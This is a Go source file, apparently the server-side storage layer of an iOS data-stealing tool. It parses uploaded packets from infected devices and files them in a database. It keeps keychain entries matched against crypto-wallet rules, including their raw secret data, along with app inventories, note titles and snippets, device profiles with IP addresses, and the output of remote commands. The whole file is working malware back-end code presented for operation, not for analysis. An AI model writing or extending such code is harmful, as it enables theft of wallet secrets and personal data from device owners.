package store

// 完整解析落库：把 u/war/nb/a/result 回传体的逐条内容结构化入库。
//
// 与 packets（指针层）解耦：正文仍在 capture/，这里把可检索的实体行写入
// apps / keychain_items / keychain_meta / memos / device_profiles / result_data。
// 幂等：依赖各表 UNIQUE 约束 + INSERT IGNORE / ON DUPLICATE KEY UPDATE
// （重复回填不产生重复行）。
// 失败静默：解析异常由调用方 SafeCall 包裹，不阻断主链。

import (
	"encoding/json"
	"strings"
)

// 解码后 JSON 正文落库上限（超出截断，只留可检索前缀，避免库膨胀）。
const dataJSONCap = 512 * 1024

// ProcessFull 按端点分发完整解析。packetID 为 packets 表主键（>0 才落库）。
func ProcessFull(endpoint string, raw []byte, packetID int64) {
	if packetID <= 0 || len(raw) == 0 {
		return
	}
	switch endpoint {
	case "u":
		parseApps(raw, packetID)
	case "war":
		parseWar(raw, packetID)
	case "nb":
		parseMemos(raw, packetID)
	case "a":
		parseProfile(raw, packetID)
	case "result":
		parseResult(raw, packetID)
	}
}

// recvTsOf 回取 packets 行的接收时间（回填/实时一致）。
func recvTsOf(packetID int64) string {
	row := GetDB().QueryOne("SELECT recv_ts FROM packets WHERE id=?", packetID)
	if row != nil {
		if s := toStr(row["recv_ts"]); s != "" {
			return s
		}
	}
	ts, _ := Now()
	return ts
}

// matchWalletRule 按 pe_worker.js 规则对 service/accessGroup 匹配钱包规则名。
func matchWalletRule(hay string) string {
	hay = strings.ToLower(hay)
	for _, rule := range WALLET_RULES {
		for _, pat := range rule.Patterns {
			if strings.Contains(hay, strings.ToLower(pat)) {
				return rule.Name
			}
		}
	}
	return ""
}

// jsonText 任意值 → 紧凑 JSON 文本（失败返回空串）。
func jsonText(v any) string {
	b, err := json.Marshal(v)
	if err != nil {
		return ""
	}
	return string(b)
}

// ── ① 应用清单（u 端点）──
func parseApps(raw []byte, packetID int64) {
	var j map[string]any
	if json.Unmarshal(raw, &j) != nil {
		return
	}
	lhu := toStr(j["lhu"])
	if lhu == "" {
		return
	}
	ts := recvTsOf(packetID)
	apps := asAnySlice(j["apps"])
	if len(apps) == 0 {
		return
	}
	rows := make([]SQLArgs, 0, len(apps))
	for _, av := range apps {
		a, _ := av.(map[string]any)
		bundle := toStr(a["bundleId"])
		if bundle == "" {
			continue
		}
		rows = append(rows, SQLArgs{
			SQL: "INSERT INTO apps(uuid, app_uuid, bundle_id, name, first_packet_id, last_packet_id, first_seen, last_seen)" +
				" VALUES(?,?,?,?,?,?,?,?)" +
				" ON DUPLICATE KEY UPDATE" +
				" app_uuid=COALESCE(VALUES(app_uuid), app_uuid)," +
				" name=COALESCE(VALUES(name), name)," +
				" last_packet_id=VALUES(last_packet_id)," +
				" last_seen=VALUES(last_seen)," +
				" hits=hits+1",
			Args: []any{lhu, toStr(a["uuid"]), bundle, toStr(a["name"]), packetID, packetID, ts, ts},
		})
	}
	GetDB().Many(rows)
}

// ── ② /war：不整包落库（正文留在 capture/war/，文件可下载）──
// 仅做钱包扫描：keychain 条目里 service/accessGroup 命中 _WALLET_RULES 的才入库
// （钱包包名 + 命中条目），keychain 全量与元数据不再进库 —— war 体量大，避免库膨胀。
func parseWar(raw []byte, packetID int64) {
	var j map[string]any
	if json.Unmarshal(raw, &j) != nil {
		return
	}
	du := toStr(j["device_uuid"])
	if du == "" {
		du = toStr(j["lhu"])
	}
	if du == "" {
		return
	}
	ts := recvTsOf(packetID)
	kc, _ := j["keychain"].(map[string]any)
	if kc == nil {
		return
	}
	tables, ok := kc["tables"].(map[string]any)
	if !ok {
		return
	}
	var rows []SQLArgs
	for tbl, tinfo := range tables {
		ti, _ := tinfo.(map[string]any)
		for _, itv := range asAnySlice(ti["items"]) {
			it, _ := itv.(map[string]any)
			svc := toStr(it["service"])
			ag := toStr(it["accessGroup"])
			rule := matchWalletRule(svc + " " + ag)
			if rule == "" {
				continue // 未命中钱包：只扫描，不落库
			}
			tname := toStr(it["_table"])
			if tname == "" {
				tname = tbl
			}
			dh := toStr(it["dataHex"])
			rows = append(rows, SQLArgs{
				SQL: "INSERT INTO keychain_items(device_uuid, tbl, wallet_rule," +
					" service, account, access_group, label, data_hex, data_len," +
					" protection_class, version, blob_sizes, rowid_orig," +
					" first_packet_id, last_packet_id, first_seen, last_seen)" +
					" VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)" +
					" ON DUPLICATE KEY UPDATE" +
					" wallet_rule=VALUES(wallet_rule)," +
					" data_hex=VALUES(data_hex), data_len=VALUES(data_len)," +
					" protection_class=VALUES(protection_class)," +
					" last_packet_id=VALUES(last_packet_id)," +
					" last_seen=VALUES(last_seen)," +
					" hits=hits+1",
				Args: []any{
					du, tname, rule,
					svc, toStr(it["account"]), ag, toStr(it["label"]),
					dh, len(dh) / 2,
					toStr(it["protectionClass"]), toStr(it["version"]),
					jsonText(it["_blobSizes"]), toStr(it["rowid"]),
					packetID, packetID, ts, ts,
				},
			})
		}
	}
	if len(rows) > 0 {
		GetDB().Many(rows)
	}
}

// ── ③ 备忘录（nb 端点）──
func parseMemos(raw []byte, packetID int64) {
	var j map[string]any
	if json.Unmarshal(raw, &j) != nil {
		return
	}
	lhu := toStr(j["lhu"])
	if lhu == "" {
		return
	}
	ts := recvTsOf(packetID)
	notes := asAnySlice(j["list"])
	if len(notes) == 0 {
		return
	}
	rows := make([]SQLArgs, 0, len(notes))
	for _, nv := range notes {
		n, _ := nv.(map[string]any)
		rows = append(rows, SQLArgs{
			SQL: "INSERT INTO memos(uuid, note_id, title, snippet, mod_ts, first_packet_id, last_packet_id, first_seen, last_seen)" +
				" VALUES(?,?,?,?,?,?,?,?,?)" +
				" ON DUPLICATE KEY UPDATE" +
					" title=VALUES(title), snippet=VALUES(snippet), mod_ts=VALUES(mod_ts)," +
					" last_packet_id=VALUES(last_packet_id)," +
					" last_seen=VALUES(last_seen)," +
					" hits=hits+1",
			Args: []any{lhu, toInt(n["id"]), toStr(n["title"]),
				toStr(n["snippet"]), fmtMod(n["mod"]), packetID, packetID, ts, ts},
		})
	}
	GetDB().Many(rows)
}

// ── ④ 设备档案（a 端点）──
func parseProfile(raw []byte, packetID int64) {
	var j map[string]any
	if json.Unmarshal(raw, &j) != nil {
		return
	}
	uuid := toStr(j["lhu"])
	if uuid == "" {
		return
	}
	ts := recvTsOf(packetID)
	GetDB().Exec(
		"INSERT INTO device_profiles(uuid, machine, device_name, ios_version, build_version,"+
			" hostname, sysname, `release`, kern_version, ip, source, first_seen, last_seen)"+
			" VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?)"+
			" ON DUPLICATE KEY UPDATE"+
			" machine=VALUES(machine), device_name=VALUES(device_name),"+
			" ios_version=VALUES(ios_version), build_version=VALUES(build_version),"+
			" hostname=VALUES(hostname), sysname=VALUES(sysname), `release`=VALUES(`release`),"+
			" kern_version=VALUES(kern_version), ip=VALUES(ip), source=VALUES(source),"+
			" last_seen=VALUES(last_seen)",
		uuid, toStr(j["machine"]), toStr(j["deviceName"]), toStr(j["ios_version"]),
		toStr(j["build_version"]), toStr(j["hostname"]), toStr(j["sysname"]),
		toStr(j["release"]), toStr(j["kern_version"]), toStr(j["ip"]), toStr(j["source"]),
		ts, ts)
}

// ── ⑤ 指令结果（result 端点）──
func parseResult(raw []byte, packetID int64) {
	var j map[string]any
	if json.Unmarshal(raw, &j) != nil {
		return
	}
	ts := recvTsOf(packetID)
	cid := toStr(j["command_id"])
	uuid := toStr(j["uuid"])
	fname := toStr(j["filename"])
	category := toStr(j["category"])

	b64 := toStr(j["data"])
	kind := "json"
	body := ""
	size := 0
	if b64 != "" {
		if dec, err := b64decodeLenient(b64); err == nil {
			size = len(dec)
			if isUTF8(dec) {
				trimmed := strings.TrimSpace(string(dec))
				if strings.HasPrefix(trimmed, "{") || strings.HasPrefix(trimmed, "[") {
					if len(trimmed) > dataJSONCap {
						trimmed = trimmed[:dataJSONCap]
					}
					body = trimmed
				} else {
					kind = "binary"
					body = binarySummary(dec)
				}
			} else {
				kind = "binary"
				body = binarySummary(dec)
			}
		}
	}

	var es, ee any
	if j["_exec_start_ms"] != nil {
		es = toInt(j["_exec_start_ms"])
	}
	if j["_exec_end_ms"] != nil {
		ee = toInt(j["_exec_end_ms"])
	}
	GetDB().Exec(
		"INSERT IGNORE INTO result_data(packet_id, command_id, uuid, filename, category,"+
			" data_json, data_kind, data_size, exec_start_ms, exec_end_ms, recv_ts)"+
			" VALUES(?,?,?,?,?,?,?,?,?,?,?)",
		packetID, cid, uuid, fname, category, body, kind, size, es, ee, ts)
}

// binarySummary 二进制正文摘要（不存原文，只存指纹 + hex 前缀）。
func binarySummary(b []byte) string {
	head := 64
	if len(b) < head {
		head = len(b)
	}
	return "sha256=" + sha256Hex(b) + " size=" + itoa(len(b)) + " hex=" + hexEncode(b[:head])
}

// hexEncode 字节 → 小写 hex（复用 util 的 sha256Hex 同族；此处内联避免重复导入）。
func hexEncode(b []byte) string {
	const digits = "0123456789abcdef"
	out := make([]byte, len(b)*2)
	for i, c := range b {
		out[i*2] = digits[c>>4]
		out[i*2+1] = digits[c&0x0f]
	}
	return string(out)
}
